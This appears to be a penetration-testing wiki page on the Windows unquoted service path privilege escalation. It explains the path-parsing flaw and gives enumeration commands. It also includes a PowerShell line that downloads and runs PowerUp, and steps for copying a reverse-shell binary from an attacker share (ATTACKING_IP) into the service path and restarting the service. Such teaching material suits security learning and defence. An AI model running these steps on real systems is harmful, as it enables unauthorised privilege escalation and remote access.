---
description: >-
  MITRE ATT&CK™ Hijack Execution Flow - Path Interception by Unquoted Path -
  Technique T1574.09
---

# Unquoted Service Path

## Theory

Windows privilege escalation through unquoted service paths is a common vulnerability that occurs when a service executable file is installed in a directory path that contains spaces but is not surrounded by quotation marks. When Windows starts a service, it looks for the executable file based on the service's configuration. If the path to the executable contains spaces and is not enclosed in quotation marks, Windows may interpret the path incorrectly. In such cases, Windows will try to locate the executable using a combination of the directory names and filenames in the path, which can result in unintended files being executed.

Here's an example to illustrate this, consider we have the following executable path:

```
C:\Program Files\A Subfolder\B Subfolder\C Subfolder\VulnSvc.exe
```

In order to run SomeExecutable.exe, the system will interpret this path in the following order:

* C:\Program.exe
* C:\Program Files\A.exe
* C:\Program Files\A Subfolder\B.exe
* C:\Program Files\A Subfolder\B Subfolder\C.exe
* C:\Program Files\A Subfolder\B Subfolder\C Subfolder\VulnSvc.exe

## Practice

{% tabs %}
{% tab title="Enumerate" %}
We can use wmic to enumerate it:

```powershell
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """

gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

Alternativly, we can use `Invoke-AllChecks` from PowerUp

```powershell
powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"
```
{% endtab %}

{% tab title="Exploit" %}
You can check if you have write acces to a folder with `icacls`

```powershell
icacls "C:\Program Files\A Subfolder\"
```

If you can write to it, you can place your binary like:

```powershell
copy \\ATTACKING_IP\Share\reverse.exe C:\Program Files\A Subfolder\B.exe  
```

And then, restart the service

```powershell
#Using wmic
wmic service <Service_Name> call stopservice
wmic service <Service_Name> call startservice

#Using net
net stop <Service_Name> && net start <Service_Name>

#Using sc.exe
sc stop <Service_Name>
sc start <Service_Name>
```
{% endtab %}
{% endtabs %}

### References

{% embed url="https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---unquoted-service-paths" %}
